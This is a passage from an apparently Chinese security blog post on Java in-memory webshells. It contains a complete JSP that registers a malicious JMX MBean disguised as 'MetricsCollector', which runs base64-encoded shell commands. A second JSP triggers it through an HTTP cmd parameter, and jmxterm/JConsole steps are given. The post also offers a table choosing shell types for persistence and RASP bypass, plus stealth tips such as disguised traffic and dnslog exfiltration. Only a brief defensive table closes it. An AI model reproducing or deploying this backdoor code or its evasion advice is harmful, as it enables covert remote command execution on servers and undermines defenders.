&#125;<br>%&gt;<br></code></pre></td></tr></table></figure>

<p><img src="/mdimg/javamemshell1/1759059398715-7e1aaf66-533c-4ce8-86e0-090c06771a96.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="MBean-内存马"><a href="#MBean-内存马" class="headerlink" title="MBean 内存马"></a>MBean 内存马</h2><ul>
<li>挂载点：JMX MBean。</li>
<li>原理：Java Management Extensions (JMX) 允许对 Java 应用程序进行管理和监控。攻击者可以注册恶意的<code>MBean</code>，并通过 JMX 远程调用这些<code>MBean</code>中定义的方法，从而实现远程代码执行 (RCE) 或其他恶意操作。</li>
<li>企业级危害：如果 JMX 端口暴露或存在弱认证，攻击者可以直接通过 JMX 远程管理协议触发内存马，实现高度隐蔽的 RCE，尤其是在管理工具或监控系统中可能被忽视。</li>
</ul>
<h3 id="JMX与MBean"><a href="#JMX与MBean" class="headerlink" title="JMX与MBean"></a>JMX与MBean</h3><ol>
<li>什么是 JMX？</li>
</ol>
<ul>
<li>JMX（Java Management Extensions） 是 Java 平台标准的监控与管理框架。</li>
<li>允许开发者暴露应用内部状态（如内存、线程、连接池）供外部管理工具（如 JConsole、VisualVM）查看和操作。</li>
<li>所有 Java 应用（包括 Tomcat、Spring Boot）默认启动一个 Platform MBeanServer。</li>
</ul>
<ol start="2">
<li>什么是 MBean？</li>
</ol>
<ul>
<li>MBean（Managed Bean） 是 JMX 中被管理的对象。</li>
<li>通常是一个 Java POJO 类，遵循特定命名规范（如 <code>MyServiceMBean</code> 接口 + <code>MyService</code> 实现类），或实现 <code>DynamicMBean</code> 接口。</li>
<li>MBean 可以暴露：<ul>
<li>属性（Attributes）：如 <code>getThreadCount()</code></li>
<li>操作（Operations）：如 <code>gc()</code>、<code>reloadConfig()</code></li>
</ul>
</li>
</ul>
<ol start="3">
<li>MBeanServer 是什么？</li>
</ol>
<ul>
<li>MBeanServer 是 MBean 的注册中心和调度器。</li>
<li>所有 MBean 必须注册到 MBeanServer 才能被管理。</li>
<li>获取方式：</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">MBeanServer</span> <span class="hljs-variable">mbs</span> <span class="hljs-operator">=</span> ManagementFactory.getPlatformMBeanServer();<br></code></pre></td></tr></table></figure>

<h3 id="内存马-2"><a href="#内存马-2" class="headerlink" title="内存马"></a>内存马</h3><p>适用于 Tomcat、Spring Boot 等支持 JMX 的 Java 应用。它通过注册一个恶意的 MBean（Managed Bean） 到 MBeanServer，利用 JMX 的远程管理能力实现命令执行。</p>
<ol>
<li>JMX（Java Management Extensions） 是 Java 内置的监控和管理框架。</li>
<li>所有 Java 应用默认启动一个 Platform MBeanServer。</li>
<li>攻击者可动态注册一个 恶意 MBean（实现 <code>DynamicMBean</code> 或普通 POJO + <code>MBean</code> 接口）。</li>
<li>通过 JConsole / jmxterm / HTTP JMX Proxy 调用其方法，实现命令执行。</li>
<li>优势：<ul>
<li>无需修改 Web 层（Filter/Servlet/Valve）</li>
<li>不依赖 Tomcat 内部类（兼容 Spring Boot JAR / WAR）</li>
<li>默认开启（除非显式关闭 JMX）</li>
</ul>
</li>
</ol>
<p>shell.jsp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.management.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.management.ManagementFactory&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Base64&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Arrays&quot;</span> %&gt;<br><br>&lt;%<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 1. 获取平台 MBeanServer（所有 Java 应用都有）</span><br>        <span class="hljs-type">MBeanServer</span> <span class="hljs-variable">mbs</span> <span class="hljs-operator">=</span> ManagementFactory.getPlatformMBeanServer();<br><br>        <span class="hljs-comment">// 2. 定义 ObjectName（唯一标识）</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">domain</span> <span class="hljs-operator">=</span> mbs.getDefaultDomain();<br>        <span class="hljs-type">ObjectName</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectName</span>(domain + <span class="hljs-string">&quot;:type=Service,name=MetricsCollector&quot;</span>);<br>        System.out.println(name);<br><br>        <span class="hljs-comment">// 3. 检查是否已注册（避免重复）</span><br>        <span class="hljs-keyword">if</span> (mbs.isRegistered(name)) &#123;<br>            out.println(<span class="hljs-string">&quot;[+] MBean 已存在，跳过注入&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 4. 创建恶意 MBean 实例（使用 DynamicMBean 避免接口）</span><br>            <span class="hljs-type">DynamicMBean</span> <span class="hljs-variable">evilMBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DynamicMBean</span>() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getAttribute</span><span class="hljs-params">(String attribute)</span> <span class="hljs-keyword">throws</span> AttributeNotFoundException, MBeanException, ReflectionException &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br><br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAttribute</span><span class="hljs-params">(Attribute attribute)</span> &#123;&#125;<br><br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">public</span> AttributeList <span class="hljs-title function_">getAttributes</span><span class="hljs-params">(String[] attributes)</span> &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AttributeList</span>();<br>                &#125;<br><br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">public</span> AttributeList <span class="hljs-title function_">setAttributes</span><span class="hljs-params">(AttributeList attributes)</span> &#123;<br>                    <span class="hljs-keyword">return</span> attributes;<br>                &#125;<br><br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(String actionName, Object[] params, String[] signature)</span> <span class="hljs-keyword">throws</span> MBeanException, ReflectionException &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;exec&quot;</span>.equals(actionName) &amp;&amp; params != <span class="hljs-literal">null</span> &amp;&amp; params.length == <span class="hljs-number">1</span>) &#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getDecoder().decode(((String) params[<span class="hljs-number">0</span>]).trim()));<br>                            Process p;<br>                            <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                                p = Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd.exe /c &quot;</span> + cmd);<br>                            &#125; <span class="hljs-keyword">else</span> &#123;<br>                                p = Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;);<br>                            &#125;<br><br>                            <span class="hljs-comment">// Java 8 兼容读取</span><br>                            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> p.getInputStream();<br>                            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>                            <span class="hljs-type">byte</span>[] data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4096</span>];<br>                            <span class="hljs-type">int</span> nRead;<br>                            <span class="hljs-keyword">while</span> ((nRead = in.read(data, <span class="hljs-number">0</span>, data.length)) != -<span class="hljs-number">1</span>) &#123;<br>                                buffer.write(data, <span class="hljs-number">0</span>, nRead);<br>                            &#125;<br>                            <span class="hljs-type">byte</span>[] result = buffer.toByteArray();<br><br>                            <span class="hljs-comment">// 读取 stderr（可选）</span><br>                            <span class="hljs-type">InputStream</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> p.getErrorStream();<br>                            <span class="hljs-keyword">if</span> (err.available() &gt; <span class="hljs-number">0</span>) &#123;<br>                                buffer.reset();<br>                                <span class="hljs-keyword">while</span> ((nRead = err.read(data, <span class="hljs-number">0</span>, data.length)) != -<span class="hljs-number">1</span>) &#123;<br>                                    buffer.write(data, <span class="hljs-number">0</span>, nRead);<br>                                &#125;<br>                                result = buffer.toByteArray();<br>                            &#125;<br><br>                            <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(result);<br>                        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br><br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">public</span> MBeanInfo <span class="hljs-title function_">getMBeanInfo</span><span class="hljs-params">()</span> &#123;<br>                    MBeanOperationInfo[] ops = &#123;<br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">MBeanOperationInfo</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;Execute command&quot;</span>,<br>                                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">MBeanParameterInfo</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">MBeanParameterInfo</span>(<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;java.lang.String&quot;</span>, <span class="hljs-string">&quot;Base64 command&quot;</span>)&#125;,<br>                                    <span class="hljs-string">&quot;java.lang.String&quot;</span>, MBeanOperationInfo.ACTION)<br>                    &#125;;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MBeanInfo</span>(<span class="hljs-built_in">this</span>.getClass().getName(), <span class="hljs-string">&quot;Metrics Collector&quot;</span>,<br>                            <span class="hljs-keyword">new</span> <span class="hljs-title class_">MBeanAttributeInfo</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">MBeanConstructorInfo</span>[<span class="hljs-number">0</span>], ops, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MBeanNotificationInfo</span>[<span class="hljs-number">0</span>]);<br>                &#125;<br>            &#125;;<br><br>            <span class="hljs-comment">// 5. 注册 MBean</span><br>            mbs.registerMBean(evilMBean, name);<br>            out.println(<span class="hljs-string">&quot;[+] MBean 内存马注入成功！&quot;</span>);<br>        &#125;<br><br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-comment">// 静默失败</span><br>        out.println(<span class="hljs-string">&quot;[-] 注入失败&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>

<p>3种方式调用jmx</p>
<ol>
<li>http</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.management.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.management.ManagementFactory&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Base64&quot;</span> %&gt;<br>&lt;%<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd == <span class="hljs-literal">null</span> || cmd.isEmpty()) &#123;<br>            out.println(<span class="hljs-string">&quot;Usage: ?cmd=id&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Base64 编码命令</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">b64cmd</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(cmd.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br><br>        <span class="hljs-comment">// 调用 MBean</span><br>        <span class="hljs-type">MBeanServer</span> <span class="hljs-variable">mbs</span> <span class="hljs-operator">=</span> ManagementFactory.getPlatformMBeanServer();<br>        <span class="hljs-type">ObjectName</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectName</span>(<span class="hljs-string">&quot;DefaultDomain:type=Service,name=MetricsCollector&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> mbs.invoke(name, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;b64cmd&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;java.lang.String&quot;</span>&#125;);<br><br>        <span class="hljs-comment">// 解码并输出结果</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getDecoder().decode((String) result), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span> + output + <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        out.println(<span class="hljs-string">&quot;Error&quot;</span>);<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure>

<p><img src="/mdimg/javamemshell1/1759061846469-c97ab624-0492-4a74-b25e-5fc343f9c8b5.png" srcset="/img/loading.gif" lazyload></p>
<ol start="2">
<li>本地JConsole</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">jps -l<br># 输出示例：<br># <span class="hljs-number">12345</span> org.apache.catalina.startup.Bootstrap<br>jconsole <span class="hljs-number">12345</span><br></code></pre></td></tr></table></figure>

<ul>
<li>切换到 <strong>MBeans</strong> 标签页</li>
<li>左侧树形菜单展开：<code>Catalina（此处是DefaultDomain）</code> → <code>Service</code></li>
<li>点击 <code>MetricsCollector</code></li>
<li>切换到 <strong>Operations</strong> 子标签</li>
<li>找到 <code>exec</code> 方法，在输入框中填入命令的 Base64（如 <code>d2hvYW1p</code>）</li>
<li>点击 <strong>exec</strong> 按钮</li>
</ul>
<p><img src="/mdimg/javamemshell1/1759062147462-1d36eabb-bebb-4696-8f7c-1d5201daace9.png" srcset="/img/loading.gif" lazyload></p>
<ol start="3">
<li>远程JMX连接（需要开启远程JMX）</li>
</ol>
<blockquote>
<p>适用场景：目标 Java 应用 <strong>显式开启了远程 JMX</strong>（生产环境较少见）。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">-Dcom.sun.management.jmxremote<br>-Dcom.sun.management.jmxremote.port=<span class="hljs-number">9999</span><br>-Dcom.sun.management.jmxremote.authenticate=<span class="hljs-literal">false</span><br>-Dcom.sun.management.jmxremote.ssl=<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure>

<p><code>jconsole target_ip:9999</code></p>
<p>和本地操作一致</p>
<p>或使用命令行工具 <code>jmxterm</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"># 下载 jmxterm.jar（https:<span class="hljs-comment">//github.com/jiaqi/jmxterm）</span><br>java -jar jmxterm.jar -l target_ip:<span class="hljs-number">9999</span> -u user -p password<br><br># 在 jmxterm 中操作<br>&gt; bean Catalina:type=Service,name=MetricsCollector<br>&gt; run exec aWQ=<br># 返回 Base64 结果，本地解码<br></code></pre></td></tr></table></figure>

<h3 id="销毁Mbean内存马"><a href="#销毁Mbean内存马" class="headerlink" title="销毁Mbean内存马"></a>销毁Mbean内存马</h3><ul>
<li>注册后，该 MBean 成为 JVM 管理体系的一部分。</li>
<li>生命周期与 JVM 一致。</li>
</ul>
<p>即重新部署web应用或者重启tomcat都会销毁Mbean内存马</p>
<h2 id="Agent-内存马"><a href="#Agent-内存马" class="headerlink" title="Agent 内存马"></a>Agent 内存马</h2><ul>
<li><strong>挂载点：</strong>JVM Instrumentation API /<code>sun.misc.Unsafe</code>API。</li>
<li><strong>原理：</strong>这是最复杂也最强大的内存马类型。攻击者利用 Java Agent 或<code>sun.misc.Unsafe</code>等底层 API，<strong>动态修改或替换已加载类的字节码</strong>。例如，Hook 关键的安全检查方法、数据库操作方法或命令执行方法，直接在程序核心逻辑中植入后门。</li>
<li><strong>企业级危害：极难检测，隐蔽性最高</strong>。它直接篡改 JVM 内部运行的类，可以绕过大多数应用层面的检测，实现深度持久化，甚至可以劫持类加载过程，阻碍后续的修复和检测。</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h5 id="各内存马执行顺序"><a href="#各内存马执行顺序" class="headerlink" title="各内存马执行顺序"></a>各内存马执行顺序</h5><p>[容器层]</p>
<ol>
<li>Tomcat Valve 内存马</li>
</ol>
<ul>
<li>执行时机：最早，在请求进入 Web 应用前就已执行</li>
<li>可拦截所有请求（包括未映射路径、静态资源）</li>
<li>绕过 Web 应用层所有安全机制</li>
</ul>
<p>[Web 应用层]</p>
<ol start="2">
<li>ServletContextListener内存马,web应用启动时（不参与http）</li>
<li>HttpSessionListener内存马（可前可后，取决于何时调用 getSession()</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 在 Filter 中调用 getSession() → 触发 sessionCreated() 则执行在filter中</span><br><span class="hljs-comment">// 在 Controller 中调用 getSession() → 同样触发，但已在 Filter 之后</span><br></code></pre></td></tr></table></figure>

<ol start="4">
<li>ServletRequestListener内存马</li>
</ol>
<p><code>ServletRequestListener.requestInitialized()</code>在filter之前</p>
<ol start="5">
<li>Filter 内存马</li>
</ol>
<p>[Servlet 层]</p>
<ol start="6">
<li>Servlet内存马</li>
</ol>
<p>[Spring MVC 层]</p>
<ol start="7">
<li>Spring Interceptor 内存马（preHandle）</li>
<li>Spring Controller 内存马（@RequestMapping 方法）</li>
</ol>
<p>[响应返回]</p>
<p>请求的逆序</p>
<h5 id="使用场景分类"><a href="#使用场景分类" class="headerlink" title="使用场景分类"></a>使用场景分类</h5><table>
<thead>
<tr>
<th><strong>场景</strong></th>
<th><strong>推荐内存马类型</strong></th>
<th><strong>理由</strong></th>
</tr>
</thead>
<tbody><tr>
<td>快速上线、通用兼容</td>
<td><strong>Filter</strong></td>
<td>无需框架、全局拦截、代码简单、清除需重部署</td>
</tr>
<tr>
<td>长期潜伏、对抗清除</td>
<td><strong>Listener + Filter</strong></td>
<td>Listener 可监听 Context 重启并重新注入 Filter</td>
</tr>
<tr>
<td>高权限、深度隐藏</td>
<td><strong>Tomcat Valve</strong></td>
<td>在 Filter 之前执行，日志/监控常忽略</td>
</tr>
<tr>
<td>绕过 RASP/Spring</td>
<td><strong>Java Agent</strong></td>
<td>不经过 Web 层，直接 Hook，RASP 无法拦截</td>
</tr>
<tr>
<td>远程管理、后渗透</td>
<td><strong>MBean</strong></td>
<td>可通过 JConsole / JMX 远程执行，适合内网横向</td>
</tr>
<tr>
<td>Spring 环境快速利用</td>
<td><strong>Spring Controller</strong></td>
<td>无需反射，直接注入 HandlerMapping，但易被刷新</td>
</tr>
</tbody></table>
<h5 id="提高隐蔽性总体方向"><a href="#提高隐蔽性总体方向" class="headerlink" title="提高隐蔽性总体方向"></a>提高隐蔽性总体方向</h5><ul>
<li>路径/参数/文件名无敏感词</li>
<li>自定义 Header/json传参</li>
<li>请求参数和返回值编码</li>
<li>dnslog等外带</li>
<li>响应伪装成正常业务（状态码、Content-Type、Body、json，静态资源、业务路径）</li>
<li>不打印日志、不抛异常</li>
<li>敏感字符串运行时拼接</li>
</ul>
<p> <strong>终极原则</strong>：<strong>让流量看起来像正常用户，让内存看起来像正常框架，让文件系统无痕迹。</strong></p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>内存马需要能执行Java代码，通过防御webshell如上传jsp、反序列化漏洞等就能使内存马无法注入。</p>
<table>
<thead>
<tr>
<th><strong>内存马类型</strong></th>
<th><strong>防御手段</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Filter / Servlet / Listener</td>
<td>监控 <code>ServletContext.addXxx()</code> 调用；启用 SecurityManager；部署后禁止动态注册</td>
</tr>
<tr>
<td>Spring Controller</td>
<td>禁用 Actuator <code>/refresh</code>；监控 <code>RequestMappingHandlerMapping</code> 修改</td>
</tr>
<tr>
<td>Java Agent</td>
<td>禁止 <code>-javaagent</code> 参数；限制 <code>attach</code> 权限；使用 JVMTI 监控</td>
</tr>
<tr>
<td>Tomcat Valve</td>
<td>审计 <code>server.xml</code>；监控 <code>StandardEngine/Host/Pipeline</code> 反射调用</td>
</tr>
<tr>
<td>MBean</td>
<td>关闭不必要的 JMX 端口；启用 JMX 认证；监控 <code>MBeanServer.registerMBean</code></td>
</tr>
</tbody></table>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E7%A0%94%E7%A9%B6/" class="category-chain-item">研究</a>
  
  
    <span>></span>
    
  <a href="/categories/%E7%A0%94%E7%A9%B6/%E7%AC%94%E8%AE%B0/" class="category-chain-item">笔记</a>
  
  

  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E7%AC%94%E8%AE%B0/" class="print-no-link">#笔记</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Java内存马原理及利用</div>
      <div>http://example.com/2025/10/02/Java内存马原理及利用/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>J_0k3r</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年10月2日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              BY J_0K3R 
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/06/01/fastjson%20%E5%88%A9%E7%94%A8/" title="fastjson利用">
                        <span class="hidden-mobile">fastjson利用</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
      <div class="col-lg-7 mx-auto nopadding-x-md">
        <div class="container custom mx-auto">
           <!--音乐--> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css"> <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/meting@1.2/dist/Meting.min.js"></script> <div id="player" class="aplayer aplayer-withlist aplayer-fixed" data-id="9723733050" data-server="netease" data-type="playlist" autoplay="true" data-order="list"  data-fixed="true" data-listfolded="true" data-theme="#2D8CF0"></div> 
        </div>
      </div>
    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       J_0k3r <i class="iconfont icon-love"></i> Hor1zon<br /> 感谢 <a target="_blank" rel="noopener" href="https://www.dkdun.cn/">DK盾</a> 赞助|DK盾 QQ群:727077055 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
